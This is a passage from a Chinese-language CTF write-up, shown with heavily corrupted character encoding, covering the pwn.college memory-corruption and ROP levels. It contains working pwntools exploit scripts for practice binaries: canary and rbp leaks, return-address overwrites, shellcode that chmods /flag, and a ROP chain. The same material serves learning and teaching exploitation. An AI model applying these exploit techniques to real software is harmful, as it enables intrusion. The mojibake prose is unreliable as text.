æƒ³äº†æƒ³, æ ˆæŒ‡é’ˆåŠ 8ä¹Ÿä¸ä¼šå¯¹ç¬¬ä¸€ä¸ªchallengeçš„æ ˆå¸§é€ æˆä»€ä¹ˆå½±å“. æ¢æˆä¸‹é¢è¿™ä¸ª, æ³¨æ„å°ç«¯æ³•.<br><code>[hex(ord(character)) for character in &#39;/flag&#39;] =&gt; [&#39;0x2f&#39;, &#39;0x66&#39;, &#39;0x6c&#39;, &#39;0x61&#39;, &#39;0x67&#39;]</code> </li><li>æ²¡æ–™åˆ°æ‰‹å†™shellcodeä¼šæœ‰ä¸€å †çš„ç©ºå­—ç¬¦. æ”¾å¼ƒæ‰‹å†™, è½¬ä¸ºpwntoolç”Ÿæˆ.</li><li>sizeå†™å¤ªå¤§, REPEATåé¢çš„æ¢è¡Œç¬¦éƒ½ç»™è¯»è¿›å»äº†.</li><li>æ‹›æ¶ä¸ä½canaryå’Œrbpé‡Œé¢ä¹Ÿæœ‰ç©ºå­—ç¬¦â€¦å¤šè¯•å‡ æ¬¡å°±è¡Œäº†</li><li>IDAå˜é‡å®šä¹‰é”™äº†, å­˜åœ¨ä¸€ä¸ªæŒ‡å‘å­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆ, readå‚æ•°è¿˜å‡ºç°äº†å¯¹bufçš„è§£å¼•ç”¨, åŠå¤©æ²¡çœ‹å‡ºæ¥.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#bufåœ¨rbp-0x38çš„ä½ç½®, canaryåœ¨rbp-0x8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#binary = glob(&quot;/challenge/t*&quot;)[0]</span><br>binary = <span class="hljs-string">&quot;./toddlerone_level3.1.elf64&quot;</span><br>context.binary = binary<br>p = process(binary) <br><br><span class="hljs-comment">#ç¬¬ä¸€æ¬¡leak canary</span><br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;bytes)!\n&quot;</span>)<br>shellcode=shellcraft.amd64.chmod(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;0x04&#x27;</span>)<br>payload = asm(shellcode) <br>payload = payload.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;canary&#x27;</span>+canary)<br><br><span class="hljs-comment">#ç¬¬äºŒæ¬¡leak rbp</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;64&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>rbp_byte = p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rbp = <span class="hljs-built_in">int</span>.from_bytes(rbp_byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp = &#x27;</span>+<span class="hljs-built_in">hex</span>(rbp))<br><br><span class="hljs-comment">#ç¬¬ä¸‰æ¬¡æ‰§è¡Œshellcode.</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;200&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rbp-<span class="hljs-number">0x40</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br></code></pre></div></td></tr></table></figure><h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>çœ‹èµ·æ¥å’Œä¸Šä¸€é¢˜æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«, å°±æ˜¯88å­—èŠ‚çš„æ•°ç»„æœ«å°¾8å­—èŠ‚è¦æ˜¯ä¸€ä¸ªç¡®å®šçš„æ•°å­—æ‰èƒ½æ­£å¸¸return.</p><p>%sæ²¡æœ‰é™åˆ¶. executable stack.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#å‡ ä¹ä¸€æ ·çš„ä»£ç , ä¸æ‰“å‡ºæ¥äº†.</span><br></code></pre></div></td></tr></table></figure><h4 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h4><p>else repeatåŠ äº†ä¸€ä¸ªseccomp, æ„Ÿè§‰åˆæ²¡ä»€ä¹ˆåŒºåˆ«.</p><h4 id="level6-3"><a href="#level6-3" class="headerlink" title="level6"></a>level6</h4><p>è¿™ä¸‹å­çœŸæœ‰åŒºåˆ«äº†, seccompåœ¨challengeè¿”å›çš„æ—¶å€™æ— æ³•é¿å…. ä¿æŠ¤ä¸€æ ·, ä»ç„¶æ˜¯å¯æ‰§è¡Œæ ˆ.</p><p>åªå…è®¸writeå’Œexit_group. è¿™æ˜¯èƒ½åšçš„å—? ä¸€æ¬¡loadå‰©ä¸‹çš„æ‰§è¡Œæµç¨‹éƒ½ä¼šè¢«é™åˆ¶.</p><p>æ²¡äº‹äº†, æˆ‘è¿ä»–çš„é™åˆ¶çš„å†…å®¹ä¹Ÿå¯ä»¥ä¿®æ”¹. æ”¹æˆæˆ‘æƒ³è¦çš„å°±è¡Œäº†. æ€»å…±å…è®¸ä¸¤ä¸ªsyscall.</p><p>æ”¹æˆ90 chmod 91 fchmodå°±è¡Œ.</p><h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>åŠ ä¸Šäº†PIE. åˆ©ç”¨éšæœºåœ°å€ä»ç„¶æ˜¯4KBå¯¹é½æ¥ä¿®æ”¹æœ€åä¸¤ä¸ªå­—èŠ‚, ä¸è¿‡æœ€é«˜å››ä½åªèƒ½ç¢°è¿æ°”äº†(\x29ä¸­çš„â€™2â€™)</p><ul><li>ä½¿ç”¨vimç¼–è¾‘äºŒè¿›åˆ¶æ–‡ä»¶ç›´æ¥æŠŠéprintå­—ç¬¦æ•´æˆä¸€ä¸ªé—®å·å­˜èµ·æ¥â€¦â€¦æ¢ä¸ªåŠæ³•ä¿®æ”¹å¥½äº†â€¦..</li><li>è¦ä¹ˆä½¿ç”¨ç¼–è¾‘å™¨, è¦ä¹ˆvimä¸­ä½¿ç”¨<code>set binary</code>æˆ–<code>-b</code>å‚æ•°, ç„¶å<code>%!xxd</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>heapä¸Šmallocä¸€ä¸ªsizeåŒºåŸŸ, ä¸ƒå…«åå­—èŠ‚, ä½†æ˜¯åœ¨è¿™ä¸ªåŒºåŸŸä¸­ä½¿ç”¨strlen, åœ¨ä¸€å †pedä¸­åŠ å…¥ä¸€ä¸ªç©ºå­—ç¬¦å³å¯. </p><p>è€Œä¸”åŠ äº†PIE. å¦‚åŒä¸Šä¸€é¢˜çš„åšæ³•.</p><h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><p>ä¿æŠ¤å…¨å¼€. <a href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p><p>æœ€å¤§çš„é—®é¢˜æ˜¯å¼€äº†canary.</p><p>å˜¶â€”-æˆ‘çŸ¥é“äº†, åˆ©ç”¨å†…å­˜å¯»å€å¯ä»¥è·³è¿‡canaryä»è€Œç›´æ¥ä¿®æ”¹retaddr.</p><p>0x79ä¸‹ä¸€ä¸ªæ˜¯0x80ä¹Ÿæ˜¯å¾ˆå¯ä»¥. ä¸‹æ¬¡å†™åå…­è¿›åˆ¶ä¸€å®šåŠ å‰ç¼€.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>å·²ç»å°†flagè¯»åˆ°äº†æ ˆä¸Š, ä¸ºäº†printfçš„%sèƒ½å¤Ÿæ‰“å°å‡ºæ¥, æŠŠbufå‰é¢110ä¸ªå­—èŠ‚å¡«å……ä¸ºéé›¶, ç´§æ¥ç€å°±æ˜¯flagå†…å®¹, è¿™æ ·%sçš„æ‰“å°å°±ä¸ä¼šåœ¨110å¤„åœæ­¢.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure><h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>ä¿æŠ¤å…¨å¼€, è¿™é¢˜æ˜¯mmapçš„ä½¿ç”¨, ä»¥å‰è¿˜æ²¡çœ‹è¿‡è¯¦ç»†çš„æœºåˆ¶. youtubeçš„ä¸€ä¸ª<a href="https://www.youtube.com/watch?v=8hVLcyBkSXY">è§†é¢‘</a>, è¿˜ä¸é”™.</p><p>ä¸€è¿å‡ ä¸ªmmapéƒ½æ˜¯æ²¡æœ‰address hintçš„, å…¨éƒ½è¿åœ¨ä¸€èµ·. è€Œä¸”æ˜¯å‘ä½åœ°å€æ–¹å‘map,  æœ€åmapçš„regionåè€Œåœ¨ä½åœ°å€.</p><img src="../../image/pwn-modules/image-20220426223702228.png" alt="image-20220426223702228" style="zoom:80%;" /><p>æœ€åçš„mapåªæŒ‡å®šäº†0x5cä¸ªå­—èŠ‚, ä¸è¿‡è¿˜æ˜¯åˆ†é…äº†0x1000ä¸€æ•´ä¸ªpage, å…¨ä¸ºå¯å†™å¯è¯». <strong>æ²¡ææ‡‚çš„æ˜¯ä¸ºä»€ä¹ˆ/flagæ˜ å°„çš„æ˜¯åªèƒ½æ‰§è¡Œä¹Ÿå¯ä»¥è¢«printfè¯»å–å‡ºæ¥</strong>..</p><p>æ‰€ä»¥ç»“æœä¹Ÿå¾ˆç®€å•, 0x3000å­—èŠ‚å³å¯.</p><h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>ä»ç„¶æ˜¯å…¨å¼€.</p><p>èƒ½é‡å¤æ‰§è¡Œchallenge, éš¾ä¸æˆæ˜¯leak canary? è€Œä¸”è¿˜æœ‰printf %s.</p><ul><li>ç¬¬ä¸€æ¬¡0x19ä¸ª(å› ä¸ºbufå’Œcanaryä¹‹é—´æœ‰undefinedåŒºåŸŸ)å¡«å……å­—ç¬¦, leakå‡ºcanary, ç„¶åå†æ¬¡è¿›å…¥challenge</li><li>ä¸ºäº†èƒ½è·³è½¬åˆ°win, å¿…é¡»æ‰§è¡Œå®Œchallenge, å³é€šè¿‡canaryéªŒè¯. ç¬¬ä¸€æ¬¡æ‰§è¡Œè¦†ç›–äº†canaryç¬¬ä¸€å­—èŠ‚å¿…å®šä¸æˆåŠŸ, ç¬¬äºŒæ¬¡åˆ©ç”¨leakå‡ºçš„canaryæ¥é€šè¿‡éªŒè¯å¹¶ä¸”ä¿®æ”¹è¿”å›åœ°å€çš„ä½ä¸¤å­—èŠ‚.</li><li>è¿™ä¹ˆä¸€è¯´æ„Ÿè§‰å¾—ç”¨pwntoolsæ¥å†™äº†.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><span class="hljs-comment">#ä¸€ç›´è¯•åˆ°æˆåŠŸä¸ºæ­¢.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure><h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>å¤§æ»¡å¼€!</p><p>é‡å¤åˆ©ç”¨æ²¡æœ‰æ¸…ç©ºçš„å †æ ˆå†…å®¹. flagåœ¨<code>rbp-0x10f</code>å¼€å§‹çš„0x100å­—èŠ‚ä¸Š. æ‰€ä»¥åœ¨challengeæ ˆå¸§ä¸­ä¹Ÿä»è¿™ä¸ªä½ç½®è¯»å–å³å¯. ç¥å¥‡çš„æ˜¯æœ‰ä¸€å¤§å—ç©ºé—´æ²¡æœ‰è¢«å®šä¹‰. æˆ–è®¸æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ç„¶åæ²¡æœ‰ä½¿ç”¨? è¿™æ ·çš„è¯è¿˜ä¸èƒ½è¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰.</p><p>v5ä»rbp-0x120å¼€å§‹, å¡«ä¸Š0x20 byte is enough.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>ä¹Ÿæ˜¯leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p><p>â€¦â€¦â€¦â€¦.</p><h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCPè¿æ¥, åˆ©ç”¨forkçš„ç‰¹ç‚¹æ¥ç»•è¿‡canary.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure><ul><li><a href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure><h1 id="module-A-rop"><a href="#module-A-rop" class="headerlink" title="module A-rop"></a>module A-rop</h1><p>ROP</p><ul><li>rp++, ROPgadget.<ul><li><code>rp++ --unique -r2 -f /bin/bash | grep -P &quot;(add|sub|mov) rax, r..&quot;</code> </li></ul></li><li>store addresses into registers</li><li>stack pivot: æ ˆè½¬ç§».</li><li>data transfer.</li><li>USE INFO IN THE STACK OR REGISTERS.</li></ul><p>Counter-CFI(Control Flow Integrity) techniques:</p><ul><li><input disabled="" type="checkbox"> <strong>B(lock)OP:</strong> ROP on a block (or multi-block) level by carefully compensating for side-effects.</li><li><input checked="" disabled="" type="checkbox"> <strong>J(ump)OP:</strong> instead of returns, use indirect jumps to control execution flow</li><li><input checked="" disabled="" type="checkbox"> <strong>C(all)OP:</strong> instead of returns, use indirect calls to control execution flow</li><li><input checked="" disabled="" type="checkbox"> <strong>S(ignreturn)ROP:</strong> instead of returns, use the sigreturn system call </li><li><input disabled="" type="checkbox"> <strong>D(ata)OP:</strong> instead of hijacking control flow, carefully overwrite the programâ€™s data to puppet it</li></ul><p><strong>Intel Edition(endbr64 after ret instruction)</strong> is still bypassable by some advanced ROP techniques (<u>Block Oriented Programming, SROP, etc</u>), but it will significantly complicate exploitation.</p><p><a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">Hacking blind</a>:</p><ul><li>The standard blind attack requires a <strong>forking service</strong>. å°±åƒ</li><li>Break ASLR and the canary byte-by-byte. Now we can redirect memory semi-controllably.</li><li>Redirect memory until we have a <em>survival signal</em> (i.e., an address that doesnâ€™t crash).</li><li>Use the survival signal to find non-crashing ROP gadgets.</li><li>Find functionality to produce output.</li><li>Leak the program.</li><li>Hack it.</li></ul><p>æ‰€è°“çš„libc.so.6å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥. å¦‚æœè¦æ›´æ”¹libcæ–‡ä»¶ç›´æ¥ä¸´æ—¶ä¿®æ”¹ä¸€ä¸‹ç¬¦å·é“¾æ¥<strong>è¿˜è¦æ³¨æ„ldå’Œlibcçš„åŒ¹é…é—®é¢˜</strong>. æˆ–è€…ä½¿ç”¨patchelfæ”¹ä¸€ä¸‹, é“¾æ¥<a href="https://bbs.pediy.com/thread-254868-1.htm">åœ¨è¿™</a>. (é‚£ä¸ªglibc_all_in_oneå°±åœ¨è¿™å„¿ç”¨çš„)(æˆå¤©ç”¨çš„éƒ½æ˜¯å·¥å…·, çœŸæƒ³è‡ªå·±å†™ä¸€ä¸ª)</p><img src="../../image/pwn-modules/image-20220507102703295.png" alt="image-20220507102703295" style="zoom:80%;" /><blockquote><p>YouTube-42è§†é¢‘æ˜¯ropçš„æ–°ç”¨æ³•â€¦ pwntoolè¿˜å†…ç½®äº†rop. çœŸè¡Œå•Š.</p></blockquote><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>å•¥ä¸»è¦çš„ä¿æŠ¤ä¹Ÿæ²¡å¼€, ç®€å•çš„è¦†ç›–è¿”å›åœ°å€.</p><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>æ²¡å¼€å•¥ä¿æŠ¤, æŸ¥äº†ä¸€ä¸‹lseekçš„ä½¿ç”¨, ä¸»è¦å°±æ˜¯winå‡½æ•°åˆ†æˆäº†ä¸¤ä¸ªé˜¶æ®µ, ä¸€æ¬¡è¯»ä¸€åŠ.</p><p>åªè¦åœ¨æ ˆä¸Šå¼„ä¸¤ä¸ªè¿”å›åœ°å€å°±è¡Œäº†. ç®€å•</p><h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>5ä¸ªstage, æ¯ä¸ªstageéƒ½è¦æœ‰å¯¹åº”æ•°å­—çš„å‚æ•°, ç®€å•è·³è¿‡.</p><h4 id="level4-3"><a href="#level4-3" class="headerlink" title="level4"></a>level4</h4><p>æœ‰ä¸€æ•´ä¸ªå‡½æ•°ç”¨æ¥æä¾›gadgets.</p><img src="../../image/pwn-modules/image-20220505210342026.png" alt="image-20220505210342026" style="zoom:80%;" /><p>åˆ©ç”¨è¿™å‡ ä¸ªgadgetså°±å¯ä»¥å®ç°chmodç³»ç»Ÿè°ƒç”¨äº†. (æˆ–è€…execve)</p><p>rdiæ˜¯â€™/flagâ€™å­—ç¬¦ä¸²çš„åœ°å€, å­˜åœ¨æ ˆä¸Š. é‰´äºæ ˆç©ºé—´ä¼šä¸æ–­çš„å‡å°‘, å°±å­˜åœ¨challengeçš„æ ˆå¸§ä¸­. </p><p>å¥½å§, è¿™æ ˆåœ°å€ä¼šå˜åŒ–çš„. å¤§æ„äº†, æ ˆå¸§åº•éƒ¨æœ‰ä¸€ä¸ªå˜é‡.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27; at: 0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>rbp = buf + <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-built_in">hex</span>(rbp))<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">init-pwndbg</span><br><span class="hljs-string">si</span><br><span class="hljs-string">b *challenge+86</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">6</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x4015fb</span>, buf, <span class="hljs-number">0x40161b</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x40160c</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0x4015e3</span>])<br>p.sendline(pl)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>è¿™ä¸€é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¹‹ä¸Š, æ²¡æœ‰æç¤ºbufçš„æ‰€åœ¨ä½ç½®.</p><p>çªç„¶æƒ³èµ·æ¥babyjailé‡Œé¢æœ‰ä¸€ä¸ªopenat. æˆ‘æˆ–è®¸å¯ä»¥ç”¨<code>fchmodat</code>.</p><p>æƒ³å‡ºæ¥äº†ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„æ–¹æ³•, åœ¨IDAä¸­æœç´¢åˆ°äº†å­—èŠ‚åºåˆ—<code>&#39;\x66\x00&#39;</code>, å°±æ˜¯å­—ç¬¦ä¸²<code>f\0</code>çš„è¡¨ç¤º,<br>åœ¨è¿™ä¹‹å‰è¦å…ˆä½¿ç”¨<code>ln -s /flag /home/hacker/f</code>å‘½ä»¤æ¥åˆ›å»ºç¬¦å·é“¾æ¥, å†ä½¿ç”¨pythonæ¥ç”Ÿæˆinput,<br>æœ€åå†å‘½ä»¤è¡Œä¸­è¿™æ ·æ‰§è¡Œæ–‡ä»¶<code>/challenge/babyrop_level5.1 &lt;input 6&lt;.</code>, è¿™æ ·å°±è¡Œäº†.<br>æˆ–è®¸å¯ä»¥ä½¿ç”¨åˆ«çš„å­—ç¬¦ä¸². æ¯”å¦‚ä¸€äº›å‡½æ•°å.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 